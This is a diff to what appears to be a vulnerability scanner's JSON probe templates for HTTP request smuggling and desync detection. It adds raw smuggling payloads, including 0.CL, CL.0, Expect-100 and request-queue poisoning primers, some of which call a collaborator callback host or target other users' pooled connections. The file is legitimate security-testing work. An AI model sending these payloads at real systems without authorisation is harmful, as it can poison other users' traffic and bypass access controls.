@@ -3,15 +3,31 @@
   "contexts": {
     "cl_zero": {
       "description": "CL.0 desync -- server ignores Content-Length on certain endpoints, treating POST body as start of next request",
-      "tech_match": ["Apache", "Nginx", "AWS ALB", "HAProxy", "IIS", "Node.js"],
+      "tech_match": [
+        "Apache",
+        "Nginx",
+        "AWS ALB",
+        "HAProxy",
+        "IIS",
+        "Node.js"
+      ],
       "param_match": [],
       "probes": [
         {
           "payload": "POST {{baseline}} HTTP/1.1\r\nHost: {{host}}\r\nContent-Length: 5\r\n\r\n0\r\n\r\nGET /swktest-desync-{{marker}} HTTP/1.1\r\nHost: {{host}}\r\n\r\n",
           "description": "CL.0 desync probe -- send POST with body containing smuggled GET; if server ignores CL, smuggled request processes as separate request",
           "matchers": [
-            {"type": "status", "status": [200, 404]},
-            {"type": "length_diff", "min_diff": 50}
+            {
+              "type": "status",
+              "status": [
+                200,
+                404
+              ]
+            },
+            {
+              "type": "length_diff",
+              "min_diff": 50
+            }
           ],
           "severity": "high",
           "confidence_boost": 55
@@ -20,7 +36,10 @@
           "payload": "POST {{baseline}} HTTP/1.1\r\nHost: {{host}}\r\nContent-Length: 0\r\nContent-Length: 50\r\n\r\nGET /swktest-clcl-{{marker}} HTTP/1.1\r\nX: x",
           "description": "Duplicate Content-Length desync -- front-end uses first CL (0), back-end uses second CL (50), smuggling the trailing request",
           "matchers": [
-            {"type": "length_diff", "min_diff": 50}
+            {
+              "type": "length_diff",
+              "min_diff": 50
+            }
           ],
           "severity": "high",
           "confidence_boost": 50
@@ -29,15 +48,31 @@
     },
     "client_side_desync": {
       "description": "Client-side desync -- abuse browser connection pooling to poison same-origin requests via desync in same TCP connection",
-      "tech_match": ["Apache", "Nginx", "Node.js", "Express"],
+      "tech_match": [
+        "Apache",
+        "Nginx",
+        "Node.js",
+        "Express"
+      ],
       "param_match": [],
       "probes": [
         {
           "payload": "POST {{baseline}} HTTP/1.1\r\nHost: {{host}}\r\nContent-Length: 0\r\nTransfer-Encoding: chunked\r\n\r\n",
           "description": "CL+TE probe for client-side desync -- test if server accepts both CL and TE headers (prerequisite for browser-powered desync)",
           "matchers": [
-            {"type": "status", "status": [200]},
-            {"type": "not_word", "words": ["bad request", "400"]}
+            {
+              "type": "status",
+              "status": [
+                200
+              ]
+            },
+            {
+              "type": "not_word",
+              "words": [
+                "bad request",
+                "400"
+              ]
+            }
           ],
           "severity": "high",
           "confidence_boost": 40
@@ -46,8 +81,19 @@
           "payload": "GET {{baseline}} HTTP/1.1\r\nHost: {{host}}\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\n",
           "description": "GET with Transfer-Encoding -- some servers process chunked encoding on GET, enabling desync when browser reuses connection",
           "matchers": [
-            {"type": "status", "status": [200]},
-            {"type": "not_word", "words": ["bad request", "not allowed"]}
+            {
+              "type": "status",
+              "status": [
+                200
+              ]
+            },
+            {
+              "type": "not_word",
+              "words": [
+                "bad request",
+                "not allowed"
+              ]
+            }
           ],
           "severity": "high",
           "confidence_boost": 35
@@ -56,15 +102,31 @@
     },
     "pause_based": {
       "description": "Pause-based desync -- send headers, pause, then send body; timeout differences between layers cause desync",
-      "tech_match": ["Apache", "Nginx", "HAProxy", "AWS ALB"],
+      "tech_match": [
+        "Apache",
+        "Nginx",
+        "HAProxy",
+        "AWS ALB"
+      ],
       "param_match": [],
       "probes": [
         {
           "payload": "POST {{baseline}} HTTP/1.1\r\nHost: {{host}}\r\nContent-Length: 100\r\n\r\n",
           "description": "Pause-based desync detection -- send headers with large CL then delay body; if front-end times out and forwards partial request, back-end treats remaining data as new request",
           "matchers": [
-            {"type": "timing", "min_ms": 5000},
-            {"type": "status", "status": [408, 502, 504], "condition": "or"}
+            {
+              "type": "timing",
+              "min_ms": 5000
+            },
+            {
+              "type": "status",
+              "status": [
+                408,
+                502,
+                504
+              ],
+              "condition": "or"
+            }
           ],
           "severity": "high",
           "confidence_boost": 40
@@ -73,30 +135,272 @@
     },
     "h2_desync": {
       "description": "HTTP/2 desync -- exploit HTTP/2-to-HTTP/1 downgrade to inject smuggled requests",
-      "tech_match": ["Nginx", "AWS ALB", "CloudFront", "HAProxy"],
+      "tech_match": [
+        "Nginx",
+        "AWS ALB",
+        "CloudFront",
+        "HAProxy"
+      ],
       "param_match": [],
       "probes": [
         {
           "payload": "{{baseline}}",
           "description": "H2.CL desync -- HTTP/2 request with Content-Length header that disagrees with actual body length; H2 doesn't use CL but back-end HTTP/1 translation does",
           "matchers": [
-            {"type": "length_diff", "min_diff": 100}
+            {
+              "type": "length_diff",
+              "min_diff": 100
+            }
           ],
           "severity": "high",
           "confidence_boost": 45,
-          "variables": {"header": "Content-Length: 0"}
+          "variables": {
+            "header": "Content-Length: 0"
+          }
         },
         {
           "payload": "{{baseline}}",
           "description": "H2.TE desync -- inject Transfer-Encoding via HTTP/2 pseudo-headers or trailers; back-end HTTP/1 processes chunked encoding",
           "matchers": [
-            {"type": "length_diff", "min_diff": 50}
+            {
+              "type": "length_diff",
+              "min_diff": 50
+            }
           ],
           "severity": "high",
           "confidence_boost": 45,
-          "variables": {"header": "Transfer-Encoding: chunked"}
+          "variables": {
+            "header": "Transfer-Encoding: chunked"
+          }
+        }
+      ]
+    },
+    "zero_cl_desync": {
+      "description": "0.CL \u2014 first server reads Content-Length: 0 and discards body; second server reads body as the next request. Detection: send POST with CL: 0 and a smuggled `GET /admin HTTP/1.1\\r\\nHost: target\\r\\n\\r\\n` body; follow-up request observes admin response or admin-only header.",
+      "tech_match": [
+        "apache",
+        "haproxy",
+        "envoy",
+        "nginx",
+        "cloudfront",
+        "cloudflare",
+        "fastly"
+      ],
+      "param_match": [],
+      "probes": [
+        {
+          "payload": "Content-Length: 0\r\n\r\nGET / HTTP/1.1\r\nHost: COLLABORATOR\r\n\r\n",
+          "description": "0.CL primer. Reissue baseline request immediately afterwards \u2014 anomaly = baseline response served the smuggled GET",
+          "matchers": [
+            {
+              "type": "collaborator",
+              "weight": 100
+            },
+            {
+              "type": "status",
+              "status": [
+                400,
+                408,
+                500,
+                502,
+                503
+              ],
+              "condition": "or"
+            },
+            {
+              "type": "header_added",
+              "headers": [
+                "x-cache-status",
+                "via"
+              ]
+            }
+          ],
+          "severity": "critical",
+          "confidence_boost": 75,
+          "variables": {
+            "collaborator": "{{collaborator}}"
+          }
+        }
+      ]
+    },
+    "cl_zero_desync": {
+      "description": "CL.0 \u2014 frontend trusts CL; backend ignores it. Smuggled request body lives past the first server's read. Variant of 0.CL with reversed trust direction.",
+      "tech_match": [
+        "apache",
+        "haproxy",
+        "envoy",
+        "nginx",
+        "aws alb"
+      ],
+      "param_match": [],
+      "probes": [
+        {
+          "payload": "Content-Length: 35\r\n\r\nGET /robots.txt HTTP/1.1\r\nHost: t\r\n",
+          "description": "CL.0 primer. Watch for unexpected /robots.txt response served on the next request",
+          "matchers": [
+            {
+              "type": "regex",
+              "pattern": "User-agent:|Disallow:",
+              "weight": 80
+            },
+            {
+              "type": "status",
+              "status": [
+                200,
+                400,
+                500
+              ],
+              "condition": "or"
+            }
+          ],
+          "severity": "critical",
+          "confidence_boost": 75,
+          "variables": {}
+        }
+      ]
+    },
+    "visible_te_desync": {
+      "description": "V-H (visible Transfer-Encoding) \u2014 one server processes TE chunked, the other reads CL. Differs from classic TE.CL by having the TE header in a form the second server *sees* but doesn't recognise (e.g. obsolete linear whitespace, multiple TE headers with same value).",
+      "tech_match": [
+        "apache",
+        "haproxy",
+        "envoy",
+        "tomcat",
+        "iis"
+      ],
+      "param_match": [],
+      "probes": [
+        {
+          "payload": "Transfer-Encoding: chunked\r\nTransfer-encoding : chunked\r\nContent-Length: 6\r\n\r\n0\r\n\r\nXSSED",
+          "description": "Visible-TE primer. Smuggled `XSSED` appears as front of next request on backend",
+          "matchers": [
+            {
+              "type": "status",
+              "status": [
+                400,
+                500
+              ],
+              "condition": "or"
+            },
+            {
+              "type": "timing",
+              "min_delay_ms": 3000,
+              "weight": 60
+            }
+          ],
+          "severity": "critical",
+          "confidence_boost": 70,
+          "variables": {}
+        }
+      ]
+    },
+    "expect_100_desync": {
+      "description": "Expect: 100-continue based desync. Some intermediaries strip Expect after forwarding the headers; backend waits for 100-continue that never comes, eventually times out, then reads next request body as continuation.",
+      "tech_match": [
+        "apache",
+        "tomcat",
+        "jetty",
+        "haproxy"
+      ],
+      "param_match": [],
+      "probes": [
+        {
+          "payload": "Expect: 100-continue\r\nContent-Length: 999999\r\n\r\nSMUGGLED_BODY",
+          "description": "Expect 100-continue primer. Watch for follow-up request stalled or seeing SMUGGLED_BODY at start of its body",
+          "matchers": [
+            {
+              "type": "status",
+              "status": [
+                400,
+                408,
+                417,
+                500
+              ],
+              "condition": "or"
+            },
+            {
+              "type": "timing",
+              "min_delay_ms": 5000,
+              "weight": 70
+            }
+          ],
+          "severity": "high",
+          "confidence_boost": 60,
+          "variables": {}
+        }
+      ]
+    },
+    "rqp_request_queue_poison": {
+      "description": "Request-Queue Poisoning \u2014 smuggled headers persist on a keep-alive connection that backend recycles across many fronted users. Single primer affects every subsequent request on that pooled connection.",
+      "tech_match": [
+        "haproxy",
+        "envoy",
+        "apache",
+        "nginx"
+      ],
+      "param_match": [],
+      "probes": [
+        {
+          "payload": "Transfer-Encoding: chunked\r\nConnection: keep-alive\r\n\r\n0\r\n\r\nGET /healthz HTTP/1.1\r\nX-Praetor-Poison: COLLABORATOR\r\n\r\n",
+          "description": "Persistent-poison primer. Follow with reissued benign request \u2014 vulnerable backend echoes X-Praetor-Poison or hits COLLABORATOR on the next user's traffic",
+          "matchers": [
+            {
+              "type": "collaborator",
+              "weight": 100
+            },
+            {
+              "type": "header_added",
+              "headers": [
+                "x-praetor-poison"
+              ]
+            }
+          ],
+          "severity": "critical",
+          "confidence_boost": 80,
+          "variables": {
+            "collaborator": "{{collaborator}}"
+          }
+        }
+      ]
+    },
+    "double_desync_amplification": {
+      "description": "Double-desync \u2014 two primers in sequence achieve persistent state corruption that a single primer cannot. Useful when one of the desync conditions only fires after a particular header state is already wedged.",
+      "tech_match": [
+        "haproxy",
+        "envoy"
+      ],
+      "param_match": [],
+      "probes": [
+        {
+          "payload": "Content-Length: 4\r\nTransfer-Encoding: chunked\r\n\r\n5c\r\nGPOST / HTTP/1.1\r\nFoo: bar\r\n\r\n0\r\n\r\n",
+          "description": "Double-primer (CL+TE then nested malformed chunk). Anomaly = first response 200 with no body, second response with smuggled GPOST echoed",
+          "matchers": [
+            {
+              "type": "status",
+              "status": [
+                200,
+                400,
+                500
+              ],
+              "condition": "or"
+            },
+            {
+              "type": "regex",
+              "pattern": "GPOST|Foo: bar",
+              "weight": 70
+            },
+            {
+              "type": "length_delta",
+              "delta": 200,
+              "weight": 50
+            }
+          ],
+          "severity": "critical",
+          "confidence_boost": 70,
+          "variables": {}
         }
       ]
     }
-  }
+  },
+  "description": ". v1.0 extension: Kettle BH USA / DEFCON 33 2025 variants \u2014 0.CL, CL.0, V-H, Expect-100, RQP, double-desync."
 }
